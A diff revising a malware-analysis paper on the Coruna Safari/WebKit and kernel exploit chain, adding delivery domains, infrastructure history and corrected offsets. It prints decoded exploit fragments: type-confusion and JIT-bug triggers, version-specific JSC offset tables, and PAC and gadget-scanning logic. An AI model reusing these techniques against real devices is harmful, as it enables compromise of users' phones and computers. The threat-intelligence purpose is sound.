@@ -6,24 +6,28 @@
 
 ## Abstract
 
-Coruna is a multi-stage, multi-platform browser exploit framework targeting Apple's Safari/WebKit engine on ARM64 (arm64e) devices running iOS and macOS. Delivered via watering-hole compromise, the chain executes entirely within the browser context - parsing Mach-O binaries from JavaScript, scanning system framework memory for ROP/JOP gadgets, bypassing Apple's Pointer Authentication Codes (PAC), escaping the JIT cage, and establishing command-and-control communication - all without dropping a single file to disk. This paper presents a complete static reverse engineering of 16 recovered JavaScript modules totaling approximately 700KB of heavily obfuscated source code, including full XOR string decryption (500+ strings), WebAssembly module extraction and disassembly, ARM64 instruction mask mapping, and C++ symbol demangling of targeted JavaScriptCore internals.
+Coruna is a multi-stage, multi-platform exploit chain targeting Apple's Safari/WebKit engine and XNU kernel on ARM64 (arm64e) devices running iOS and macOS. Operated by UNC6691 (GTIG, March 2026), the chain progresses from browser exploitation through kernel compromise to persistent root-level access - parsing Mach-O binaries from JavaScript, scanning system framework memory for ROP/JOP gadgets, bypassing Apple's Pointer Authentication Codes (PAC), escaping the JIT cage, establishing C2 communication, triggering a kernel vulnerability in IOSurfaceRoot (CVE-2023-41974), forging entitlements via `cs_blob` manipulation, and remounting the root filesystem read-write. This paper presents a complete static reverse engineering of the browser stage (15 unique JavaScript modules, 28 files, ~700KB of obfuscated source) and the kernel exploit (`dump.bin`, a 2MB ARM64 DYLIB with 649 functions), including full XOR string decryption (191 unique strings across 1,250 instances), WebAssembly module extraction, ARM64 instruction mask mapping, Mach-O binary structure analysis, symbol/import categorization (265 kernel exploit imports), kill chain integration, and attribution to UNC6691.
 
 ---
 
 ## Table of Contents
 
 1. [Infrastructure & Command-and-Control](#1-infrastructure--command-and-control)
-2. [Module System & Obfuscation Layer](#2-module-system--obfuscation-layer)
-3. [Mach-O Binary Parser](#3-mach-o-parser--dyld-cache-walker)
-4. [Exploit Entry Points (Three Parallel Paths)](#4-webkit-exploit-primitives)
-5. [JIT Exploit Engine (addrof/fakeobj Primitives)](#5-trigger-mechanisms--pac-bypass)
-6. [ARM64 Gadget Scanner](#6-arm64-gadget-scanner)
-7. [PAC Bypass Chain](#7-pac-bypass--authenticated-call-chain)
-8. [JIT Cage Escape](#8-jit-cage-escape--native-code-execution)
-9. [Final Payloads & Post-Exploitation](#9-final-payload-assembly--post-exploitation)
-10. [WebAssembly Module Analysis](#10-embedded-webassembly-module-analysis)
-11. [Full Decoded String Appendix](#11-appendix-a---decoded-string-inventory)
-12. [IOCs & Detection Signatures](#12-appendix-b---indicators-of-compromise--detection)
+2. Module System & Obfuscation Layer
+3. Mach-O Binary Parser
+4. Exploit Entry Points (Three Parallel Paths)
+5. JIT Exploit Engine (addrof/fakeobj Primitives)
+6. ARM64 Gadget Scanner
+7. PAC Bypass Chain
+8. JIT Cage Escape
+9. Final Payloads & Post-Exploitation
+10. WebAssembly Module Analysis
+11. Full Decoded String Appendix
+12. IOCs & Detection Signatures
+13. Conclusion
+14. Kernel Exploitation Stage (`dump.bin`)
+15. Kill Chain Integration
+16. Attribution & Threat Actor Profile
 
 ---
 
@@ -37,7 +41,7 @@ Delivery is via **watering-hole compromise**: a legitimate website visited by th
 
 ### 1.2 Payload Inventory
 
-The recovered `urls.txt` maps all 14 payload URLs to their functional roles. Each filename is the SHA1 hash of its content, and each module self-registers into the custom module system (Section 2) using a separate internal SHA1 hash. The full inventory:
+The recovered `urls.txt` maps all 13 payload URLs to their functional roles. Each filename is the SHA1 hash of its content, and each module self-registers into the custom module system (Section 2) using a separate internal SHA1 hash. The full inventory:
 
 | # | Role | Internal Hash (truncated) | Filename Hash |
 |---|------|--------------------------|---------------|
@@ -112,7 +116,7 @@ The final payloads use a `Uint32Array`-backed state machine for coordination bet
 
 The state machine is polled via `setTimeout(U.wA, 1)` - a tight 1ms polling loop. When the exploit kernel writes a URL into the command buffer and sets the state to `READY`, the C2 handler reads the URL, performs the HTTP request, writes the response into the response buffer, and transitions back to `IDLE`. The `INJECT` state (`6`) triggers the DOM injection path described above.
 
-The total shared buffer size is computed as `928462177 ^ 911684961` = **16,842,560 bytes** (~16MB), split evenly between command and response regions.
+The total shared buffer size is computed as `928462177 ^ 911684961` = **16,777,216 bytes** (exactly 2^24 = 16MB), split evenly between command and response regions.
 
 ### 1.6 URL Pattern Matching
 
@@ -123,6 +127,37 @@ The payloads contain URL matching patterns for identifying which fetched resourc
 - `.min.js.js$` - anchored variant ensuring the match is at the end of the URL
 
 These patterns suggest the watering-hole injection targets JavaScript files served by the compromised site, potentially replacing or augmenting legitimate `.js` resources with exploit-bearing payloads.
+
+### 1.7 Multi-Domain Delivery (GTIG)
+
+Our initial assessment that `b27.icu` was the sole delivery domain was based on analyzing the recovered `urls.txt` IOC file, which only contained `b27.icu` URLs. Google Threat Intelligence Group's March 2026 report documented several additional Coruna delivery domains operated by UNC6691:
+
+| Domain | Status |
+|---|---|
+| `b27[.]icu` | Active - the instance analyzed in this paper |
+| `h4k[.]icu` | Documented by GTIG |
+| `7p[.]game` | Documented by GTIG |
+| `spin7[.]icu` | Documented by GTIG |
+| `k96[.]icu` | Documented by GTIG |
+| `seven7[.]vip` | Documented by GTIG |
+
+All follow the same delivery pattern: a fraudulent gambling site or fake cryptocurrency exchange (e.g., impersonating WEEX) serves as the visible lure page, while the Coruna exploit chain loads via hidden iFrame. The `b27.icu` frontend - **7P.GAME**, a Chinese-language gambling site - is not an unrelated domain takeover; GTIG confirmed UNC6691 uses gambling lures as delivery vehicles.
+
+### 1.8 URL Derivation
+
+GTIG documented that the framework uses `sha256(COOKIE + ID)[:40]` to derive resource URLs, which explains the SHA1-hash-like filenames of all 13 JavaScript payloads on `b27.icu` (e.g., `feeee5ddaf2659ba86423519b13de879f59b326d.js`). The exploit avoids execution if the device is in Lockdown Mode.
+
+### 1.9 Registration & Infrastructure History
+
+| Date | Event |
+|---|---|
+| 2025-06-01 | Domain registered via Gname.com (Singapore). Registrant: Hong Kong, China |
+| 2025-07-08 | DNS shows direct IP `15.152.32.229` (not yet CloudFront-fronted) |
+| ~2025-12 | UNC6691 acquires Coruna framework (per GTIG) |
+| 2026-03-06 | WHOIS updated - registrant country changed to US (operational cover) |
+| 2026-03-09 | CloudFront-fronted (`d35oc5m182mh0p.cloudfront.net`), all 13 payloads still live |
+
+The registrar (Gname.com) and DNS provider (share-dns.com) remained consistent throughout, with three distinct nameserver configurations. The infrastructure evolved from direct IP hosting to CloudFront-fronted delivery - deliberate hardening over time while exploit payloads persisted byte-identical.
 
 ---
 
@@ -196,19 +231,19 @@ Every meaningful string in the framework - API names, WebKit internal class name
 ([68, 56, 18, 24, 31, 14, 6, 68, 39, 2, 9, 25, 10, 25, 18, 68, ...].map(x => {
     return String.fromCharCode(x ^ 107);
 }).join(""))
-// Decodes to: "/usr/lib/system/libsystem_platform.dylib"
+// Decodes to: "/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics"
 ```
 
-The encoding is a single-byte XOR applied element-wise to an array of integers. Each encoded string uses its own XOR key, drawn from a pool of **64 unique keys** in the range **45–122** (ASCII `-` through `z`). Across all 28 files, there are **1,250 XOR-encoded string instances**.
+The encoding is a single-byte XOR applied element-wise to an array of integers. Each encoded string uses its own XOR key, drawn from a pool of **64 unique keys** in the range **45-122** (ASCII `-` through `z`). Across all 28 files, there are **1,250 XOR-encoded string instances**.
 
 The key selection is not random - it follows a pattern that restricts keys to printable ASCII ranges:
 
 | Key Range | ASCII Range | Count of Keys |
 |-----------|-------------|---------------|
-| 45–57 | `-` through `9` | 13 |
-| 65–90 | `A` through `Z` | 26 |
+| 45-57 | `-` through `9` | 11 |
+| 65-90 | `A` through `Z` | 26 |
 | 95 | `_` | 1 |
-| 97–122 | `a` through `z` | 24 |
+| 97-122 | `a` through `z` | 26 |
 
 This constraint ensures that the encoded integer arrays contain values that, when XORed with the key, produce valid character codes. The result is that every string in the framework requires a per-instance XOR operation before use - no static analysis tool or `strings` command will extract readable content from these files.
 
@@ -216,15 +251,15 @@ Representative decoded strings include:
 
 | Encoded Array | Key | Decoded Value | Context |
 |---------------|-----|---------------|---------|
-| `[68,56,18,24,31,14,6,68,...]` | 107 | `/usr/lib/system/libsystem_platform.dylib` | Library lookup |
+| `[68,56,18,24,31,14,6,68,...]` | 107 | `/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics` | Library lookup |
 | `[38,38,45,60,33,45]` | 121 | `__TEXT` | Mach-O segment name |
 | `[3,19,2,25,0,4]` | 112 | `script` | DOM element creation |
-| `[7,7,12,29,0,12]` | 88 | `__DATA` | Mach-O segment name |
-| `[14,14,11,31,98,27,2,18,...]` | 81 | `__auth_stubs` | PAC stub section |
+| `[7,7,12,29,0,12]` | 88 | `__TEXT` | Mach-O segment name (alternate key) |
+| `[14,14,11,31,98,27,2,18,...]` | 81 | `__ZN3JSC16jitOperationListE` | C++ mangled JSC symbol |
 
 ### 2.5 XOR Numeric Constant Obfuscation
 
-Beyond strings, Coruna applies XOR encoding to **all numeric constants** that would reveal the exploit's intent. Across the framework, **1,771 XOR-encoded numeric constant instances** use the pattern `(a ^ b)` where both operands are large (5–10 digit) integers that XOR to a small, meaningful value:
+Beyond strings, Coruna applies XOR encoding to **all numeric constants** that would reveal the exploit's intent. Across the framework, **1,771 XOR-encoded numeric constant instances** use the pattern `(a ^ b)` where both operands are large (5-10 digit) integers that XOR to a small, meaningful value:
 
 ```javascript
 // Buffer sizes
@@ -252,13 +287,13 @@ The `4294967296 + (a ^ b)` pattern (where `4294967296` = 2³²) handles unsigned
 
 ### 2.6 Property Name Minification
 
-All exported module properties use 1–2 character minified names. The 14 properties exported from the core utilities module are:
+All exported module properties use 1-2 character minified names. The 14 properties exported from the core utilities module are:
 
 ```
 N, An, B, Dn, I, K, nn, O, T, tn, U, v, Vt, vn
 ```
 
-Internal class methods follow the same convention - the Mach-O parser class `nt` exposes methods like `tl()` (library lookup), `kl()` (symbol resolution), `dc()` (address computation). The exploit primitive class `ut` in `KRfmo6_166411bd.js` has 27 methods including `ne()`, `lr()`, `re()`, `le()`, `hr()`, `Dr()`, `br()`, `ee()`, `Yr()`, `Ar()`, `Pr()`, `Ci()`, `rr()`, `zi()`, `tA()`, `dr()`, `wr()`, `sr()`, each corresponding to a memory operation (read byte, read 32-bit, read 64-bit, write, search, etc.).
+Internal class methods follow the same convention - the Mach-O parser class `nt` exposes methods like `tl()` (library lookup), `kl()` (symbol resolution), `dc()` (address computation). The exploit primitive class `ut` in `KRfmo6_166411bd.js` has 33 methods including `ne()`, `lr()`, `re()`, `le()`, `hr()`, `Dr()`, `br()`, `ee()`, `Yr()`, `Ar()`, `Pr()`, `Ci()`, `rr()`, `zi()`, `tA()`, `dr()`, `wr()`, `sr()`, each corresponding to a memory operation (read byte, read 32-bit, read 64-bit, write, search, etc.).
 
 This minification is consistent with a build tool (likely a JavaScript bundler/minifier) being part of the Coruna development pipeline - the names are not hand-chosen for obfuscation but are the output of automated dead-code elimination and name mangling.
 
@@ -277,7 +312,7 @@ globalThis[([29, 32, 63, 4, 83, 82].map(x => String.fromCharCode(x ^ 107)).join(
 // Decodes to: globalThis["vKTo89"]["OLdwIx"](hash)
 ```
 
-Each indirect access uses a different XOR key pair - `(107, 117)`, `(53, 69)`, `(88, 78)` - for the namespace and method names respectively. This means that even `grep` for the literal string `vKTo89` would miss these two files. The indirect-access files correspond to the **core JIT exploit loaders** (`KRfmo6` and `b903659`), suggesting the developers applied extra obfuscation to the most critical components.
+Each indirect access uses a different XOR key pair - `(107, 117)`, `(116, 53)`, `(88, 78)`, `(108, 69)` - for the namespace and method names respectively. This means that even `grep` for the literal string `vKTo89` would miss these two files. The indirect-access files correspond to the **core JIT exploit loaders** (`KRfmo6` and `b903659`), suggesting the developers applied extra obfuscation to the most critical components.
 
 ### 2.8 Anti-Analysis Patterns
 
@@ -287,7 +322,7 @@ Every `throw` statement in the framework uses an **empty error message**:
 throw new Error("")
 ```
 
-Across all 28 files, there are exactly **28 instances** of `throw new Error("")` and **zero** instances of `throw new Error()` with any non-empty message. This is a deliberate anti-forensics measure - if the exploit fails and an exception propagates to the browser's error console, the empty message reveals nothing about what failed or why. Combined with the XOR-encoded strings, this means a crash produces no actionable diagnostic information for a defender monitoring the browser console.
+Across all 28 files, there are **exactly 28 instances** of `throw new Error("")` (one per file) and **3 unique** instances of `throw new Error(XOR_DECODE)` with XOR-encoded non-empty messages: `"jsobj must be a BigUint64Array..."`, `"unreachable"`, and `"WasmJitCageCallPrimitive only supports 8 register args, got "` (found in `KRfmo6`, `b903659`, `d9a260b`, and `eOWEVG`). The overwhelming majority use empty messages as a deliberate anti-forensics measure - if the exploit fails and an exception propagates to the browser's error console, the empty message reveals nothing about what failed or why. Combined with the XOR-encoded strings, this means a crash produces minimal actionable diagnostic information for a defender monitoring the browser console.
 
 Additionally, the framework makes no use of `console.log`, `console.warn`, `console.error`, or any other logging mechanism. There are no comments in any file. The code is fully minified with no whitespace beyond what JavaScript syntax requires. The total framework size of ~1.2MB across 28 files consists entirely of executable logic - zero bytes are spent on documentation, debugging aids, or human-readable identifiers.
 
@@ -345,11 +380,11 @@ The `case 25` handler is the most complex, parsing the full `segment_command_64`
 const n = {
     Re: e.lr(s.H(8), 16),     // segname - 16-byte string at offset 8
     Xe: e.hr(s.H(24)),        // vmaddr - 64-bit at offset 24
-    Es: e.hr(s.H(24)),        // vmsize (same field, used for bounds)
-    Os: e.hr(s.H(32)),        // filesize - 64-bit at offset 32
+    Es: e.hr(s.H(24)),        // vmaddr (duplicate read, used for bounds)
+    Os: e.hr(s.H(32)),        // vmsize - 64-bit at offset 32
     Ge: e.hr(s.H(40)),        // fileoff - 64-bit at offset 40
-    zs: e.hr(s.H(48)),        // maxprot - 64-bit at offset 48
-    $s: e.le(s.H(56)),        // initprot - 32-bit at offset 56
+    zs: e.hr(s.H(48)),        // filesize - 64-bit at offset 48
+    $s: e.le(s.H(56)),        // maxprot - 32-bit at offset 56
     qs: e.le(s.H(60)),        // nsects - 32-bit at offset 60
     Ms: e.le(s.H(64)),        // flags - 32-bit at offset 64
     flags: e.le(s.H(68)),     // (extended flags)
@@ -362,8 +397,8 @@ When deep parsing is enabled (`r = true`), the parser iterates through `n.Ms` se
 
 ```javascript
 const s = {
-    Re: e.lr(r.H(16), 16),    // sectname - offset 16
-    Vs: e.lr(r.H(0), 16),     // segname - offset 0
+    Re: e.lr(r.H(16), 16),    // segname - offset 16
+    Vs: e.lr(r.H(0), 16),     // sectname - offset 0
     Xe: e.hr(r.H(32)),        // addr - offset 32
     Os: e.hr(r.H(40)),        // size - offset 40
     Ge: e.le(r.H(48)),        // offset - offset 48
@@ -423,7 +458,7 @@ fo(t) {
 }
 ```
 
-The class provides 26 methods organized into four functional groups:
+The class provides 25 methods (excluding the constructor) organized into four functional groups, plus two internal conversion helpers:
 
 **Symbol Resolution** (5 methods):
 - `fo(name)` - resolve symbol to virtual address, return 0 if absent
@@ -455,6 +490,10 @@ The class provides 26 methods organized into four functional groups:
 - `Do(segname, callback)` - iterate segment contents as 32-bit words, invoking `callback(addr, word)` per entry
 - `Lo(segname, callback)` - iterate segment as pointer-sized entries, wrapping each in a `Vt` BigInt object
 - `Bo(target)` - search all segments for one whose address range encloses a given `target` pointer; used for locating which image contains a given code address
+
+**Internal Helpers** (2 methods):
+- `po(segment)` - convert a raw segment descriptor to a plain object with `.yt()` BigInt-to-Number conversions
+- `vo(section)` - convert a raw section descriptor to a plain object with `.yt()` conversions
 
 These methods are the workhorses of the entire exploit chain. Every subsequent stage - from finding JSC internals to locating PAC signing gadgets to resolving kernel function pointers - calls into `et` to navigate memory. The `Bo()` method is particularly important: given an arbitrary code pointer obtained from a vtable or function reference, it identifies which Mach-O image (library) contains that address, enabling the exploit to parse that image's symbol table and find adjacent functions.
 
@@ -750,11 +789,11 @@ The `er` class demonstrates that Coruna's authors had **deep knowledge of Apple'
 
 ## 4. WebKit Exploit Primitives
 
-Coruna implements two complete, independent exploit primitive engines - one in `YGPUu7_8dbfa3fd.js` (~10KB) and another in `KRfmo6_166411bd.js` (~24KB, with parallel variant `yAerzw_d6cb72f5.js`). Both ultimately produce the same artifact: a memory read/write primitive stored at `T.Dn.Pn`, but they achieve it through fundamentally different vulnerability classes. YGPUu7 exploits JavaScriptCore's NaN-boxing representation via a crafted type confusion, while KRfmo6 exploits a JIT compiler optimization bug to corrupt array backing stores. The loader modules select between them based on platform and WebKit version.
+Coruna implements two complete, independent exploit primitive engines - one in `YGPUu7_8dbfa3fd.js` (14,668 bytes) and another in `KRfmo6_166411bd.js` (~24KB, with parallel variant `yAerzw_d6cb72f5.js`). Both ultimately produce the same artifact: a memory read/write primitive stored at `T.Dn.Pn`, but they achieve it through fundamentally different vulnerability classes. YGPUu7 exploits JavaScriptCore's NaN-boxing representation via a crafted type confusion, while KRfmo6 exploits a JIT compiler optimization bug to corrupt array backing stores. The loader modules select between them based on platform and WebKit version.
 
 ### 4.1 NaN-Boxing Type Confusion (YGPUu7)
 
-**File:** `YGPUu7_8dbfa3fd.js` (~10KB, single line)
+**File:** `YGPUu7_8dbfa3fd.js` (14,668 bytes, single line)
 **Module hash:** `8dbfa3fdd44e...`
 **Imports:** `1ff010bb3e85...` (config), `6b57ca33473458838984...` (global state)
 
@@ -766,11 +805,11 @@ In JSC's 64-bit value representation, every JavaScript value is encoded as a 64-
 
 | Bits | Field | Purpose |
 |------|-------|---------|
-| `[63:44]` | StructureID | Index into JSC's structure table (20 bits) |
-| `[43:40]` | Indexing type | Array storage mode (4 bits) |
-| `[39:32]` | Cell type | Object kind identifier (8 bits) |
+| `[63:52]` | StructureID | Index into JSC's structure table (12 bits) |
+| `[51:48]` | Indexing type | Array storage mode (4 bits) |
+| `[47:32]` | Cell type | Object kind identifier (16 bits) |
 | `[31:24]` | Flags | GC and allocation metadata |
-| `[23:0]` | Butterfly/value | Pointer to property/element storage |
+| `[23:0]` | Butterfly/value | Pointer to property/element storage (24 bits) |
 
 **The Fake Object Factory:**
 
@@ -797,7 +836,7 @@ const a = (t, r) => {
 };
 ```
 
-The `isNaN()` check is critical - if the forged bit pattern falls within the IEEE 754 NaN range (`0x7FF0000000000001` through `0x7FFFFFFFFFFFFFFF`), JSC would treat it as NaN rather than a pointer, breaking the confusion. The random structureID generation (`e(1,8)<<8|e(1,8)<<4|e(1,8)<<0`) produces values in the range 0x000–0xFFF, keeping the upper bits of the double's exponent field below the NaN threshold.
+The `isNaN()` check is critical - if the forged bit pattern falls within the IEEE 754 NaN range (`0x7FF0000000000001` through `0x7FFFFFFFFFFFFFFF`), JSC would treat it as NaN rather than a pointer, breaking the confusion. The random structureID generation (`e(1,8)<<8|e(1,8)<<4|e(1,8)<<0`) produces values in the range 0x111-0x888, keeping the upper bits of the double's exponent field below the NaN threshold.
 
 **Structure Spray and Trigger:**
 
@@ -845,7 +884,7 @@ for (let t = 0; t < 2; t++) {
 return -4;
 ```
 
-This function exploits integer range confusion: by passing a value near `INT32_MAX` (2147483647) and then subtracting `2147483647 - 7 = 2147483640`, the resulting index becomes a small positive number (around 7) but through a code path that JSC's JIT compiler may have already speculated was unreachable. The function is warmed up with `16,777,216` iterations (decoded: `1885621838 ^ 1902399054`) to force JIT compilation, with the first `131,072` iterations using safe parameters, before switching to the exploit parameters.
+This function exploits integer range confusion: by passing a value near `INT32_MAX` (2147483647) and then subtracting `2147483647 - 7 = 2147483640`, the resulting index becomes a small positive number (around 7) but through a code path that JSC's JIT compiler may have already speculated was unreachable. The function is warmed up with `1,000,000` iterations (decoded: `1749300023 ^ 1749774711`) to force JIT compilation before switching to the exploit parameters.
 
 **Confusion Outcome:**
 
@@ -857,7 +896,7 @@ const S = {
     zr: i[1] >> 16 & 0xF,      // indexing type (4 bits)
     Fr: 0xFFFF & i[1],          // lower structure bits
     Lr: i[0] >> 24 & 0xFF,     // flags byte
-    Rr: 0x1FFFFF & i[0]        // butterfly bits (21 bits)
+    Rr: 0xFFFFFF & i[0]        // butterfly bits (24 bits)
 };
 
 if (S.Qr !== n) throw new Error("");  // verify structureID matches
@@ -1310,7 +1349,7 @@ Three message types coordinate the Worker lifecycle:
 
 **Version-Adaptive Offset Table:**
 
-The `tt` object contains 41 JSC internal structure offsets, initialized with base values and adjusted by the `et()` function based on the WebKit version number `l`:
+The `tt` object contains 42 JSC internal structure offsets, initialized with base values and adjusted by the `et()` function based on the WebKit version number `l`:
 
 ```javascript
 // Base values (decoded from XOR):
@@ -1333,19 +1372,19 @@ tt["29"] = true;   // PAC stripping enabled flag
 // Version adjustments:
 function et() {
     if (l >= 170000) {
-        tt["01"] = 96;  tt["02"] = 88;
-        tt["27"] = 73064;  tt["28"] = 61000;
+        tt["01"] = 96;  tt["02"] = 104;
+        tt["27"] = 77464;  tt["28"] = 77472;
     }
     if (l >= 170100) {
-        tt["27"] = 53864;  tt["28"] = 77200;
+        tt["27"] = 78488;  tt["28"] = 78496;
     }
     if (l >= 170200) {
-        tt["27"] = 69944;  tt["28"] = 78080;
+        tt["27"] = 78528;  tt["28"] = 78536;
     }
 }
 ```
 
-The offsets `tt["27"]` and `tt["28"]` - which decode to values like 52232, 73064, 53864, 69944 - represent offsets into JSC's JIT code region or compiled function metadata, and are the most version-sensitive values in the entire framework. The three threshold versions (170000, 170100, 170200) correspond to distinct Safari/WebKit builds where these internal structures were reorganized.
+The offsets `tt["27"]` and `tt["28"]` - which decode to values like 52232, 77464, 78488, 78528 - represent offsets into JSC's JIT code region or compiled function metadata, and are the most version-sensitive values in the entire framework. The three threshold versions (170000, 170100, 170200) correspond to distinct Safari/WebKit builds where these internal structures were reorganized.
 
 ### 4.7 KRfmo6 - JIT Optimization Bug (Worker Path `ct`)
 
@@ -1370,7 +1409,7 @@ i.p1 = 3853;          // reattach with different types
 i.p2 = 4823;
 ```
 
-The critical function `h(t, n)` is then JIT-compiled over millions of iterations. It accesses `o.p1` where `o` alternates between `r` (which has double arrays at `p1`) and `i` (which has integers). After 36 redundant `while(h < 1) { s.guard_p1 = 1; h++ }` loops - specifically designed to fill DFG's control flow graph and trigger aggressive optimization - the JIT eliminates the structure check on `o.p1`, assuming it will always be a double array:
+The critical function `h(t, n)` is then JIT-compiled over millions of iterations. It accesses `o.p1` where `o` alternates between `r` (which has double arrays at `p1`) and `i` (which has integers). After 72 `while(h < 1) { s.guard_p1 = 1; h++ }` loops (36 before and 36 after the type confusion trigger) - specifically designed to fill DFG's control flow graph and trigger aggressive optimization - the JIT eliminates the structure check on `o.p1`, assuming it will always be a double array:
 
 ```javascript
 let u = o.p1;        // JIT speculates: always double array
@@ -1459,11 +1498,10 @@ Class `ut`'s constructor builds a different Wasm module than Class P - this one 
 | `"btl"` | read | `() → i64` | Read the global as 64-bit |
 | `"alt"` | write | `(i64) → void` | Write to the global |
 
-The Wasm binary is larger (~130 bytes vs ~90 for YGPUu7's module) because it includes:
+The Wasm binary is larger (165 bytes vs 117 for YGPUu7's module) because it includes:
 - A function table (Section 4) with min size 1
-- 3 globals (all mutable i64)
+- 8 globals (1 × v128, 1 × i64, 1 × v128, 5 × externref)
 - NOP sleds (16 bytes of `0x33` opcode padding) in two function bodies
-- 4 additional small accessor functions (read/write for globals 0 and 1)
 
 Two instances are created (`this.ra` = executor, `this.ia` = navigator), following the same dual-instance pattern as Class P, with export methods bound as `this.ea`/`this.aa` (read) and `this.na`/`this.sa` (write).
 
@@ -1903,7 +1941,7 @@ class sa {
 
 The `Ml(address, 128)` call scans the first 128 bytes of `CFRunLoopObserverCreateWithHandler`'s code for a specific instruction pattern. It expects exactly **4 matches** and extracts two (`i[1]`, `i[2]`) as pointers to internal CFRunLoop data structures (`uu` and `au`). These are then temporarily overwritten during the `call()` method to redirect execution flow.
 
-The `call()` method builds the same 768-byte fake observer structure (offsets 120–376) and patches the two internal pointers, calls `xmlHashScanFull` via the `ia` trampoline with the fake observer as context, then reads the return value from `offset + 0x90` and restores the original pointers.
+The `call()` method builds the same 768-byte fake observer structure (offsets 120-376) and patches the two internal pointers, calls `xmlHashScanFull` via the `ia` trampoline with the fake observer as context, then reads the return value from `offset + 0x90` and restores the original pointers.
 
 #### 5.1.6 PAC Signing Gadget Scanner (Class `ta`)
 
@@ -2431,7 +2469,7 @@ Starting from the leaked address, the code aligns to a 655,360-byte boundary and
 Once the header is found, the code reads the `ncmds` field at offset 16 and iterates through load commands starting at offset 32. It handles two load command types:
 
 - **`LC_SEGMENT_64` (cmd=25)**: Reads the 16-byte segment name (at offset +8), the `vmaddr` (at offset +24, uint64), and `fileoff` (at offset +40, uint64). When the segment is `__TEXT`, it records the ASLR slide (`N = header_addr - vmaddr`). When the segment is `__LINKEDIT`, it calculates the symbol table base (`a = vmaddr + slide - fileoff`).
-- **`LC_SYMTAB` (cmd=0x80000022)** and **`LC_DYSYMTAB` (cmd=0x80000033)**: Records the symbol table offset (`n`) and size (`r`).
+- **`LC_DYLD_INFO_ONLY` (cmd=0x80000022)** and **`LC_DYLD_EXPORTS_TRIE` (cmd=0x80000033)**: Records the symbol table offset (`n`) and size (`r`).
 
 **Step 3 - Compressed trie export lookup:**
 The code reads the `__LINKEDIT` data into a local `Uint32Array` and parses the **compressed export trie** - the same LEB128+trie structure documented in Section 3. The function `g(name)` walks the trie nodes, matching edge labels character-by-character, and returns the export offset when found. The function `I(name)` wraps `g()`, prepending `"_"` to the symbol name (matching the C symbol convention).
@@ -2442,7 +2480,7 @@ The target symbol is `_pthread_main_thread_np` from `/usr/lib/system/libsystem_p
 **Step 5 - ADRP+LDR instruction decode:**
 The exploit reads 64 bytes of machine code at `H` and decodes ARM64 ADRP+LDR instruction pairs:
 
-- ADRP detection: `(instruction & 0x9F000000) === -0x61000000` - the page-relative address is extracted from bits 5–23 (imm) shifted left by 14, and bits 29–30 (immhi) shifted left by 12
+- ADRP detection: `(instruction & 0x9F000000) === -0x61000000` - the page-relative address is extracted from bits 5-23 (imm) shifted left by 14, and bits 29-30 (immhi) shifted left by 12
 - LDR detection: the subsequent instruction's immediate field gives the page offset; `L = J + 8 * (imm >> 10)` computes the final address
 
 This yields `L` - the address of the `_main_thread` pointer in `libsystem_pthread`.
@@ -2466,7 +2504,7 @@ These are NaN-boxed JSValue constants that the exploit previously placed in a 20
 
 With the `tt` array located in memory, the code:
 
-1. **Writes SVG handles** (`ot`, `st`, `at`), the JSON array, and the constant into array slots 0–4
+1. **Writes SVG handles** (`ot`, `st`, `at`), the JSON array, and the constant into array slots 0-4
 2. **Reads back the internal JSCell addresses** of those slots via the corruption R/W
 3. **Constructs class `z`** - the SVG-based R/W primitive - by passing the three `feConvolveMatrix` element references and their stack-found internal pointers
 4. **Patches the SVG elements** to overlap with the array's memory:
@@ -2475,7 +2513,7 @@ With the `tt` array located in memory, the code:
    - Patches the reference count at `(pointer + 24)` by adding `+16384`
    - Patches the type flags at `(pointer + 8)` by adding `+16384`
 5. **Constructs class `k`** (the BigInt-address Class P variant) wrapping class `z`, providing the standard memory API (`rr`, `sr`, `br`, `ee`, `ne`, `Ar`, `Pr`, etc.)
-6. **Cleans up the heap**: Iterates over all sprayed objects, zeroing their internal pointers (offsets 24–36) to prevent dangling references. Also adjusts remaining `NumberFormat` objects' reference counts by `+16384`.
+6. **Cleans up the heap**: Iterates over all sprayed objects, zeroing their internal pointers (offsets 24-36) to prevent dangling references. Also adjusts remaining `NumberFormat` objects' reference counts by `+16384`.
 
 The returned `k` instance is assigned to `T.Dn.Pn` (the global state), making it available to the rest of the exploit chain.
 
@@ -2553,13 +2591,13 @@ Once a `.kr` provider has established `T.Dn.Pn`, the `.Mh` provider uses the R/W
 |--------|------|------|----------|----------------|--------------|
 | **ios\_uOj89n** | `ios_uOj89n_bcb56dc5.js` / `25bb1b38...js` | 36,435 B | iOS | `Intl.Segmenter` (`nu:"sentence"`) | `tI4mjA` self-register |
 | **ios\_qeqLdN** | `ios_qeqLdN_ca6e6ce1.js` / `d715f1db...js` | 37,079 B | iOS | `XSLTProcessor` DOM injection | `tI4mjA` self-register |
-| **macos\_stage2\_agTkHY** | `macos_stage2_agTkHY_5264a069.js` / `5aed00fe...js` | 14,490 B | macOS | `Intl.Segmenter` (`nu:"currency"`) | Standalone (no `tI4mjA`) |
-| **macos\_stage2\_eOWEVG** | `macos_stage2_eOWEVG_55afb1a6.js` / `d9a260b1...js` | 19,535 B | macOS | `Intl.Segmenter` (`nu:"currency"`) + enhanced | Standalone (no `tI4mjA`) |
+| **macos\_stage2\_agTkHY** | `macos_stage2_agTkHY_5264a069.js` / `5aed00fe...js` | 14,490 B | macOS | `Intl.Segmenter` (`nu:"sentence"`) | Standalone (no `tI4mjA`) |
+| **macos\_stage2\_eOWEVG** | `macos_stage2_eOWEVG_55afb1a6.js` / `d9a260b1...js` | 19,535 B | macOS | `Intl.Segmenter` (`nu:"sentence"`) + enhanced | Standalone (no `tI4mjA`) |
 | **fallback\_2d2c721e** | `fallback_2d2c721e.js` / `2cea1938...js` | 36,133 B | macOS | `XSLTProcessor` fallback path | `tI4mjA` self-register |
 
 Key differences between the five:
 
-**iOS vs. macOS Segmenter locale**: iOS modules instantiate `Intl.Segmenter` with `nu:"sentence"`, while macOS stage-2 modules use `nu:"currency"`. This is not a functional difference in segmentation - both values are passed to ICU's `icu::Locale` constructor and trigger the same vulnerable code path. The divergent `nu` values serve as an **anti-signature measure**, ensuring that a single static detection rule cannot match both platforms.
+**Segmenter locale**: All Segmenter-based modules - both iOS and macOS - instantiate `Intl.Segmenter` with `nu:"sentence"`. This value is passed to ICU's `icu::Locale` constructor and triggers the vulnerable code path. The consistent `nu` value across all platforms indicates that the exploit authors used a single working configuration rather than varying it per-platform.
 
